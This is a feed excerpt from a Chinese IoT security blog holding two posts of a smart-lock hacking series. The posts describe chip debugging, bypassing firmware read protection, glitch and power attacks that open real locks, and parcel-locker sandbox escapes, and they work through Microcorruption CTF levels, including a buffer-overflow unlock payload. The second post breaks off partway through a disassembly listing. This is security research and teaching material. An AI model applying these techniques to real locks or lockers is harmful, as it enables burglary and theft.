      <category term="锁具 ctf" scheme="http://yaseng.org/tags/%E9%94%81%E5%85%B7-ctf/"/>
    
      <category term="智能快递柜破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E5%BF%AB%E9%80%92%E6%9F%9C%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="智能终端安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>《锁王创造营》第三关：釜底抽薪</title>
    <link href="http://yaseng.org/king-of-lock-3.html"/>
    <id>http://yaseng.org/king-of-lock-3.html</id>
    <published>2020-05-22T16:00:00.000Z</published>
    <updated>2020-05-22T16:52:09.740Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/0.png" alt="img"></p><p>15日，美国商务部公告升级了对华为的芯片管制，即便芯片本身不是由美国来开发设计，但是只要外国公司使用了美国芯片的制造设备，就必须获得美国政府的许可，才能向华为或其附属公司提供芯片。华为想要继续获取某些芯片或使用某些美国软件或技术相关的半导体设计，也必须获得美国的许可。</p><p>芯片是科技发展的基础，一个企业甚至国家的核心竞争力，一直以来，国人都在想方设法摆脱在芯片领域被“卡脖子”的状态，例如龙芯、飞腾、兆芯，但全球芯片生态和技术迭代的时机又一次次表明这注定是一个“路漫漫其修远兮”的艰苦过程，不过也正像上图华为回应的那样“回头看，崎岖坎坷;向前看，永不言弃。”破釜沉舟、背水一战，才是唯一出路。</p><p>智能门锁安全研究自然离不开芯片层面的攻防，数智安全研究院深耕芯片安全多年，在这一块也有所积累，接下来通过一些具体案例介绍一下智能锁中的芯片安全。</p><h2 id="智能锁芯片安全"><a href="#智能锁芯片安全" class="headerlink" title="智能锁芯片安全"></a>智能锁芯片安全</h2><h3 id="芯片调试"><a href="#芯片调试" class="headerlink" title="芯片调试"></a>芯片调试</h3><h4 id="预留接口调试"><a href="#预留接口调试" class="headerlink" title="预留接口调试"></a>预留接口调试</h4><p>如果PCB上保留了厂商在研发过程中预留的 SWD 接口，可直接通过飞线的方式，连上对应的引脚进行调试。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/1.jpg" alt=""></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/2.png" alt=""></p><p>连接 gdb 进行调试。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/3.png" alt="img"></p><h4 id="直连芯片-JTAG-引脚调试"><a href="#直连芯片-JTAG-引脚调试" class="headerlink" title="直连芯片 JTAG 引脚调试"></a>直连芯片 JTAG 引脚调试</h4><p>大部分厂商在生产环节会去掉外部引出的 JTAG 接口，因为多数量产芯片的封装格式，直接飞线难度较大，因此可以采用探针台直连芯片引脚进行调试。在研究的某款智能锁，拆解发现采用的是 MSP432G2553 作为主控，下图红框位置。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/4.png" alt="img"></p><p>该款智能锁利用手机 app 产生开锁音频信号，进过外部 AD 转换后传输至芯片中进行解密开锁处理，厂商在生产过程中比较注重安全意识，PC 上的没有保留调试接口，进一步分析的话，需要对芯片进行固件提取和在线调试。</p><p>查TI官方手册，MSP432G2553 芯片引脚定义如下，其支持四线 JTAG 和两线 SBW 的调试接口，随采用两线制 SBW 接口作为调试方式，其 16 引脚为 SBWTDIO 口，17脚为 SBWTCK 脚。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/5.jpg" alt="img"></p><p>连接引脚</p><p>两线制 SBW 对应 MSP430 仿真器上的14线排针接口，分别为 16 脚 SBWTDIO 口连仿真器第一脚 TDO，17脚 SBWTCK 连第7脚 TCK，最后需要连接 GND 脚，即芯片的第 20 脚连仿真器第9口，两线制 SBW 同时需要外部电源供电，仿真器接口定义如下图。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/6.jpg" alt="img"></p><p>按照引脚说明，开始在探针台上连接引脚，需要注意 JTAG 和 SBW 调试，对连线的长度有严格要求，超过 20 厘米信号会大幅衰减，造成无法调试，因此在探针上利用夹子和铜导线缩小接线距离。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/7.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/8.png" alt="img"></p><p>在线调试<br>连接上仿真器，启动 msp430-gdbproxy。msp430-gdb 远程连接 target remote 192.168.1.196:2000</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/9.jpg" alt="img"></p><p>接下来可以结合固件分析，协议分析等进一步研究此款锁的安全性。</p><h3 id="芯片读取"><a href="#芯片读取" class="headerlink" title="芯片读取"></a>芯片读取</h3><h4 id="jtag提取固件"><a href="#jtag提取固件" class="headerlink" title="jtag提取固件"></a>jtag提取固件</h4><p>拆焊芯片<br>首先用热风枪拆下智能锁主控芯片，该单片机型号为 ：Stm32F103R6。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/10.png" alt="img"></p><p>烧录座连接Jlink<br>芯片第一脚对齐烧录座第一脚，然后把 Jlink 插入烧录座引出的 JTAG 接口。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/11.png" alt="img"></p><p>读取固件<br>电脑上安装好 Jlink 驱动，打开 J-Flash 客户端，设置好参数，主要在配置栏选择正确的芯片型号，然后点击连接，在点击 Target-&gt;Read Back-&gt;Entire trip 即可读写固件。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/12.jpg" alt="img"></p><h4 id="绕过读保护读取固件"><a href="#绕过读保护读取固件" class="headerlink" title="绕过读保护读取固件"></a>绕过读保护读取固件</h4><p>拆开智能锁，找到PCB电路板中芯片的位置，可以直接看出芯片型号为nRF51802 。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/13.png" alt="img"></p><p>通过查阅芯片手册，找到电路板上的芯片SWD调试接口，通过JLINK连接，发现芯片设置了读保护。<br>由UICR(用户信息配置寄存器)中的RBPCONF(0x10001004)寄存器处理，如果设置为0xFFFF00FF，则启用读出保护，默认值为0xFFFFFFFF。<br>通过调试端口查看：mdw 0x10001004读取</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/14.png" alt="img"></p><p>可知智能锁有读保护。</p><p>查阅资料发现可以通过修改寄存器中的值为我们期望的内存地址，并传递给加载指令可以绕过读保护提取出固件。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/15.png" alt="img"></p><h4 id="毛刺攻击绕过读保护"><a href="#毛刺攻击绕过读保护" class="headerlink" title="毛刺攻击绕过读保护"></a>毛刺攻击绕过读保护</h4><p>除了使用软件漏洞，通过电压、电磁等毛刺攻击也可以绕过读保护 。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/16.jpg" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/17.jpg" alt="img"></p><p>(毛刺攻击 stm32 芯片 来源：chip.fail)</p><h3 id="物理攻击"><a href="#物理攻击" class="headerlink" title="物理攻击"></a>物理攻击</h3><p>通过电磁注入芯片，产生重置信号，实现开锁。 </p><video id="video" controls preload="none"><br>    <source id="mp4" src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/1590137272703594.mp4"><br></video><p>某款共享单车电路设计和机械构造存在问题，可以从外部截断输入锁体的电源线，再用一个高电压的脉冲电压作为输入电源，即可开锁。其原因在于电路设计和电机控制芯片选型存在缺陷，没有做充分的过载保护和断路保护，使控制锁柱运动的电机异常工作。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/18.jpg" alt="img"></p><p>以上为我们本期《锁王创造营》所分享的关于智能锁芯片安全的具体案例，希望能让您对智能锁具芯片安全的认知有所帮助。</p><p>在上一期《锁王创造营》中，我们成功解锁了第二关“Sydney”，今天我们将继续破解第三关——“Hanoi”。</p><h2 id="第三关：Hanoi"><a href="#第三关：Hanoi" class="headerlink" title="第三关：Hanoi"></a>第三关：Hanoi</h2><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/18.png" alt="img"></p><p>首先我们浏览一下手册，看该版本更新了哪些内容。</p><blockquote><p>OVERVIEW</p><ul><li>This lock is attached the the LockIT Pro HSM-1.</li><li>We have updated  the lock firmware  to connect with the hardwaresecurity module.</li></ul><p>DETAILS</p><p>​    …</p><p>​    LockIT Pro Hardware  Security Module 1 stores  the login password,            ensuring users  can not access  the password through  other means.            The LockIT Pro  can send the LockIT Pro HSM-1  a password, and the            HSM will  return if the password  is correct by setting  a flag in            memory.</p></blockquote><p>这里说该锁连接了 HSM-1（硬件安全模块），也就是说密码在的HSM中存储，LockIT Pro可以向HSM-1发送密码，再由HSM返回结果，而我们无法直接访问它。</p><p>接下来，我们查看反汇编窗口，看看它到底做了什么，首先是<strong>main</strong>函数，<strong>main</strong>中除了调用<strong>login</strong>函数外，并无其他功能。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4438 &lt;main&gt;</span><br><span class="line">4438: b012 2045     call   #0x4520 &lt;login&gt;</span><br><span class="line">443c: 0f43           clr   r15</span><br></pre></td></tr></table></figure><p>查看<strong>login</strong>函数，其中调用了一些函数，<strong>put</strong>函数、<strong>getsn</strong>函数请求用户输入、<strong>test_password_valid</strong>函数根据函数名知道其作用是测试密码有效性。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">4520 &lt;login&gt;</span><br><span class="line">4520: c243 1024     mov.b   #0x0, &amp;0x2410</span><br><span class="line">4524: 3f40 7e44     mov   #0x447e &quot;Enter the password to continue.&quot;, r15</span><br><span class="line">4528: b012 de45     call   #0x45de &lt;puts&gt;</span><br><span class="line">452c: 3f40 9e44     mov   #0x449e &quot;Remember: passwords are between 8 and 16 characters.&quot;, r15</span><br><span class="line">4530: b012 de45     call   #0x45de &lt;puts&gt;</span><br><span class="line">4534: 3e40 1c00     mov   #0x1c, r14</span><br><span class="line">4538: 3f40 0024     mov   #0x2400, r15</span><br><span class="line">453c: b012 ce45     call   #0x45ce &lt;getsn&gt;</span><br><span class="line">4540: 3f40 0024     mov   #0x2400, r15</span><br><span class="line">4544: b012 5444     call   #0x4454 &lt;test_password_valid&gt;</span><br><span class="line">4548: 0f93           tst   r15</span><br><span class="line">454a: 0324           jz   $+0x8</span><br><span class="line">454c: f240 f100 1024 mov.b   #0xf1, &amp;0x2410</span><br><span class="line">4552: 3f40 d344     mov   #0x44d3 &quot;Testing if password is valid.&quot;, r15</span><br><span class="line">4556: b012 de45     call   #0x45de &lt;puts&gt;</span><br><span class="line">455a: f290 c600 1024 cmp.b   #0xc6, &amp;0x2410</span><br><span class="line">4560: 0720           jne   #0x4570 &lt;login+0x50&gt;</span><br><span class="line">4562: 3f40 f144     mov   #0x44f1 &quot;Access granted.&quot;, r15</span><br><span class="line">4566: b012 de45     call   #0x45de &lt;puts&gt;</span><br><span class="line">456a: b012 4844     call   #0x4448 &lt;unlock_door&gt;</span><br><span class="line">456e: 3041           ret</span><br><span class="line">4570: 3f40 0145     mov   #0x4501 &quot;That password is not correct.&quot;, r15</span><br><span class="line">4574: b012 de45     call   #0x45de &lt;puts&gt;</span><br><span class="line">4578: 3041           ret</span><br></pre></td></tr></table></figure><p>通过开头的手册提示，我们知道密码在HSM中，我们看看<strong>test_password_valid</strong>函数做了哪些操作。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">4454 &lt;test_password_valid&gt;</span><br><span class="line">4454: 0412           push   r4</span><br><span class="line">4456: 0441           mov   sp, r4</span><br><span class="line">4458: 2453           incd   r4</span><br><span class="line">445a: 2183           decd   sp</span><br><span class="line">445c: c443 fcff     mov.b   #0x0, -0x4(r4)</span><br><span class="line">4460: 3e40 fcff     mov   #0xfffc, r14</span><br><span class="line">4464: 0e54           add   r4, r14</span><br><span class="line">4466: 0e12           push   r14</span><br><span class="line">4468: 0f12           push   r15</span><br><span class="line">446a: 3012 7d00     push   #0x7d</span><br><span class="line">446e: b012 7a45     call   #0x457a &lt;INT&gt;</span><br><span class="line">4472: 5f44 fcff     mov.b   -0x4(r4), r15</span><br><span class="line">4476: 8f11           sxt   r15</span><br><span class="line">4478: 3152           add   #0x8, sp</span><br><span class="line">447a: 3441           pop   r4</span><br><span class="line">447c: 3041           ret</span><br></pre></td></tr></table></figure><p>通过简单分析可以看到，地址0x446e调用了<strong>INT</strong>函数，根据LockIT Pro用户手册第7页，可以看到<strong>INT</strong>函数的作用是将中断号压入栈中，然后调用系统中断，在<code>call    #0x457a &lt;INT&gt;</code>上方正是将“0x7d”压入栈中，所以这是调用<strong>INT 0x7d</strong>中断。</p><p><img src="https://mmbiz.qpic.cn/mmbiz_png/UJjMWugnRj6VZ2DD8LS7p4WBvv5A5OLpX5nUaxRGbdHMfKWAicdodMVpa2BWGLPFoicXEGu99eN33YD00Ro8pPibg/640?wx_fmt=png" alt="img"></p><p>在LockIT Pro用户手册第9页中说明，调用INT 0x7d中断后，若是密码正确，将会在某一位置上覆盖标志。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/20.png" alt="img"></p><p>我们回到<strong>login</strong>函数中，使用<code>break 4548</code>命令，将断点设置在调用<strong>test_password_valid</strong>后下一条指令位置，然后<code>c</code>运行，运行过程中调用请求输入函数<strong>getns</strong>，根据调用前参数，我们不知道正确的密码，依旧填“test”。在IO交互界面提示，密码在8~16字符之间。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/21.png" alt="img"></p><p><strong>getns</strong>有两个参数，请求输入密码的内存缓冲区地址（0x2400），以及接收的最大字节数（0x1c），所以尽管上面提示密码在8~16字符之间，我们还是可以输入28（0x1c）个字符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4534: 3e40 1c00     mov   #0x1c, r14</span><br><span class="line">4538: 3f40 0024     mov   #0x2400, r15</span><br><span class="line">453c: b012 ce45     call   #0x45ce &lt;getsn&gt;</span><br></pre></td></tr></table></figure><p>待在0x4548断下以后，我们单步分析。在不知道密码的情况下，寄存器<strong>r15</strong>（r15存放test_password_valid函数的返回值）的值为0是必然的，所以执行<code>jz $+0x8</code>，跳过<code>mov.b #0xf1, &amp;0x2410</code>，随机打印提示测试密码是否有效字符串。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4544: b012 5444     call   #0x4454 &lt;test_password_valid&gt;</span><br><span class="line">4548: 0f93           tst   r15</span><br><span class="line">454a: 0324           jz   $+0x8</span><br><span class="line">454c: f240 f100 1024 mov.b   #0xf1, &amp;0x2410</span><br><span class="line">4552: 3f40 d344     mov   #0x44d3 &quot;Testing if password is valid.&quot;, r15</span><br><span class="line">4556: b012 de45     call   #0x45de &lt;puts&gt;</span><br></pre></td></tr></table></figure><p>随即<code>cmp.b</code>比较源操作数<strong>0xc6</strong>与地址0x2410的内容，其中目的操作数是绝对寻址模式。下一条指令<code>jne</code>，若是不相等则跳过<strong>unlock_door</strong>函数，ret返回。所以这是解锁的关键代码，猜测之前调用INT 0x7d时，若密码正确覆盖的正是这一地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">455a: f290 c600 1024 cmp.b   #0xc6, &amp;0x2410</span><br><span class="line">4560: 0720           jne   #0x4570 &lt;login+0x50&gt;</span><br><span class="line">4562: 3f40 f144     mov   #0x44f1 &quot;Access granted.&quot;, r15</span><br><span class="line">4566: b012 de45     call   #0x45de &lt;puts&gt;</span><br><span class="line">456a: b012 4844     call   #0x4448 &lt;unlock_door&gt;</span><br><span class="line">456e: 3041           ret</span><br><span class="line">4570: 3f40 0145     mov   #0x4501 &quot;That password is not correct.&quot;, r15</span><br><span class="line">4574: b012 de45     call   #0x45de &lt;puts&gt;</span><br><span class="line">4578: 3041           ret</span><br></pre></td></tr></table></figure><p>关于寻址模式，在msp430手册中介绍，针对源操作数的七个寻址模式和针对目的操作数的四个寻址模可在完整地址空间寻址。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/22.png" alt="img"></p><p>还记得之我们输入的密码在内存的位置吗？密码在地址0x2400起始的缓冲区中，和0x2410只相差0x10字节，而我们可以输入0x1c个字符，此时我们可以通过“溢出”0x10字符的范围，覆盖到地址0x2410中。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/23.png" alt="img"></p><h3 id="解锁"><a href="#解锁" class="headerlink" title="解锁"></a>解锁</h3><p>我们已经确定了解决方案，下面开始解锁。</p><p>填充0x10字节数据，在其末尾加上0xc6即可。</p><p>以16进制编码输入：41414141414141414141414141414141c6。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/24.png" alt="img"></p><p>成功解锁！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/25.png" alt="img"></p><p>以上就是本期《锁王创造营》的全部内容，对闯关以及其他问题感兴趣的小伙伴可以加一下我们的技术交流群哦！</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/4/26.jpg" alt="img"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol><li>MSP430 用户指南 <a href="http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf" target="_blank" rel="noopener">http://www.ti.com.cn/cn/lit/ug/zhcu032i/zhcu032i.pdf</a> </li><li>智能锁具攻防一:初探 <a href="https://yaseng.org/intelligent-lock-attack-and-defense-1.html">https://yaseng.org/intelligent-lock-attack-and-defense-1.html</a></li><li>智能锁行业安全分析报告 <a href="https://yaseng.org/intelligent-lock-industry-safety-report.html">https://yaseng.org/intelligent-lock-industry-safety-report.html</a></li><li>物联网安全百科 <a href="https://iot-security.wiki" target="_blank" rel="noopener">https://iot-security.wiki</a></li><li>nrf51822 绕过读保护 <a href="https://www.pentestpartners.com/security-blog/nrf51822-code-readout-protection-bypass-a-how-to/" target="_blank" rel="noopener">https://www.pentestpartners.com/security-blog/nrf51822-code-readout-protection-bypass-a-how-to/</a></li><li>错误注入绕过大多数现代化的芯片读保护 <a href="https://chip.fail/" target="_blank" rel="noopener">https://chip.fail/</a></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020
      
    
    </summary>
    
      <category term="物联网安全" scheme="http://yaseng.org/categories/%E7%89%A9%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="终端安全" scheme="http://yaseng.org/tags/%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能锁安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="智能锁破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="指纹锁安全" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="指纹锁破解" scheme="http://yaseng.org/tags/%E6%8C%87%E7%BA%B9%E9%94%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="长毛锁王" scheme="http://yaseng.org/tags/%E9%95%BF%E6%AF%9B%E9%94%81%E7%8E%8B/"/>
    
      <category term="锁具 ctf" scheme="http://yaseng.org/tags/%E9%94%81%E5%85%B7-ctf/"/>
    
      <category term="智能快递柜破解" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E5%BF%AB%E9%80%92%E6%9F%9C%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="智能终端安全" scheme="http://yaseng.org/tags/%E6%99%BA%E8%83%BD%E7%BB%88%E7%AB%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>《锁王创造营》第二关：暗度陈仓</title>
    <link href="http://yaseng.org/king-of-lock-2.html"/>
    <id>http://yaseng.org/king-of-lock-2.html</id>
    <published>2020-05-14T16:00:00.000Z</published>
    <updated>2020-05-22T16:50:47.797Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>“2020年4月30日起，丰巢快递柜开始实行超时收费的“会员制”，非会员包裹只可免费保存12小时，超过需收取0.5元/12小时的费用。”</strong><br>这则新闻甫出，可谓一石激起千层浪，各方媒体、民众声讨声不断。商人逐利本无可厚非，但君子爱财，取之有道，若是这“道”实为对用户的暗度陈仓之道，那么这“财”该不该取、该向谁取？这是一个值得丰巢与广大快递收、发用户好好商榷的问题。<br><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/1.png" alt="img"></p><p>所谓“术业有专攻”，目前丰巢与用户之间的收费矛盾该如何善后我们姑且不谈，但是对于在我们当下生活中普及率越来越高的如智能快递柜、自动售货机、自动洗车机器人等这些线下终端锁具安全性，我们研究院的小伙伴还是非常感兴趣的，现在让我们通过几个具体的案例研究来探讨一下智能终端存在的某些风险。</p><h2 id="智能终端安全"><a href="#智能终端安全" class="headerlink" title="智能终端安全"></a>智能终端安全</h2><h3 id="沙箱绕过"><a href="#沙箱绕过" class="headerlink" title="沙箱绕过"></a>沙箱绕过</h3><p>绕过特殊手势、断电重启等特殊操作绕过沙箱 。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/2.png" alt="img"></p><p>通过某些特殊手段使快递柜返回到安卓桌面。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/3.png" alt="img"></p><p>可以通过中间层管理APP调试快递柜，可打开所有快递柜门 。</p><h3 id="物理安全"><a href="#物理安全" class="headerlink" title="物理安全"></a>物理安全</h3><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/4.jpg" alt="img"></p><p>智能终端机箱主机柜通用钥匙。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/5.png" alt="img"></p><p>可简单物理开启机柜进行调试。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/6.gif" alt="img"></p><p>某自动售货主机机柜可被轻松技术开启。</p><h3 id="供应链安全"><a href="#供应链安全" class="headerlink" title="供应链安全"></a>供应链安全</h3><p>智能终端固件、文档等泄露。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/7.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/8.png" alt="img"></p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/9.png" alt="img"></p><p>可搭建出模拟环境</p><p>通过以上案例我们可以看出，类似这种智能终端在目前还是存在很多的安全风险的，所以某些企业在想着如何从用户那里赚钱的同时，是不是也应该多花些时间在提高产品的安全性能上下功夫呢？</p><p>回归正题，在<a href="http://mp.weixin.qq.com/s?__biz=Mzg3MzE5MTczMA==&amp;mid=2247484162&amp;idx=1&amp;sn=ec42514625c48f76fb112ed7bdd011f2&amp;chksm=cee2835ff9950a491d2de21b1faba52f44948394785c0faeb9af083ad6b930ab431ef3f404d6&amp;scene=21#wechat_redirect" target="_blank" rel="noopener">上一期《锁王创造营》</a>我们对“New Orieans”成功解锁后，地图上会出现下一个level——“Sydney”，现在让我们开始新的挑战吧。</p><p><img src="https://yaseng-1251294608.cos.ap-guangzhou.myqcloud.com/2020/5/2/10.png" alt="img"></p><h2 id="第二关：Sydeny"><a href="#第二关：Sydeny" class="headerlink" title="第二关：Sydeny"></a>第二关：Sydeny</h2><p>Lockitall LockIT Pro, rev a.02，作为前一个的更新版本，我们有必要浏览一下显示的手册：</p><blockquote><p>DETAILS</p><p>​    …</p><p>​    This is  Software Revision 02.  We have received reports  that the            prior  version of  the  lock was  bypassable  without knowing  the            password. We have fixed this and removed the password from memory.</p></blockquote><p>大概意思是从内存中删除了密码，密码不会在内存中以硬编码的形式存在了。</p><p>首先查看<strong>main</strong>函数，显然，并没有之前<strong>create_password</strong>函数。<strong>main</strong>中仍然有<strong>put</strong>函数打印字符串输出，<strong>check_password</strong>函数检查密码是否正确，以及<strong>INT</strong>函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">4438 &lt;main&gt;</span><br><span class="line">4438: 3150 9cff     add   #0xff9c, sp</span><br><span class="line">443c: 3f40 b444     mov   #0x44b4 &quot;Enter the password to continue.&quot;, r15</span><br><span class="line">4440: b012 6645     call   #0x4566 &lt;puts&gt;</span><br><span class="line">4444: 0f41           mov   sp, r15</span><br><span class="line">4446: b012 8044     call   #0x4480 &lt;get_password&gt;</span><br><span class="line">444a: 0f41           mov   sp, r15</span><br><span class="line">444c: b012 8a44     call   #0x448a &lt;check_password&gt;</span><br><span class="line">4450: 0f93           tst   r15</span><br><span class="line">4452: 0520           jnz   #0x445e &lt;main+0x26&gt;</span><br><span class="line">4454: 3f40 d444     mov   #0x44d4 &quot;Invalid password; try again.&quot;, r15</span><br><span class="line">4458: b012 6645     call   #0x4566 &lt;puts&gt;</span><br><span class="line">445c: 093c           jmp   #0x4470 &lt;main+0x38&gt;</span><br><span class="line">445e: 3f40 f144     mov   #0x44f1 &quot;Access Granted!&quot;, r15</span><br><span class="line">4462: b012 6645     call   #0x4566 &lt;puts&gt;</span><br><span class="line">4466: 3012 7f00     push   #0x7f</span><br><span class="line">446a: b012 0245     call   #0x4502 &lt;INT&gt;</span><br><span class="line">446e: 2153           incd   sp</span><br><span class="line">4470: 0f43           clr   r15</span><br><span class="line">4472: 3150 6400     add   #0x64, sp</span><br></pre></td></tr></table></figure><p>根据静态分析，在<strong>check_password</strong>函数调用后，根据之前的经验，函数返回值存放在<code>r15</code>寄存器。返回后下一条指令”tst    r15“，检查<code>r15</code>寄存器也就是的值是否为零。我们查看<strong>check_password</strong>函数进一步分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">448a &lt;check_password&gt;</span><br><span class="line">448a: bf90 2c41 0000 cmp   #0x412c, 0x0(r15)</span><br><span class="line">4490: 0d20           jnz   $+0x1c</span><br><span class="line">4492: bf90 3c67 0200 cmp   #0x673c, 0x2(r15)</span><br><span class="line">4498: 0920           jnz   $+0x14</span><br><span class="line">449a: bf90 3c65 0400 cmp   #0x653c, 0x4(r15)</span><br><span class="line">44a0: 0520           jne   #0x44ac &lt;check_password+0x22&gt;</span><br><span class="line">44a2: 1e43           mov   #0x1, r14</span><br><span class="line">44a4: bf90 6b63 0600 cmp   #0x636b, 0x6(r15)</span><br><span class="line">44aa: 0124           jeq   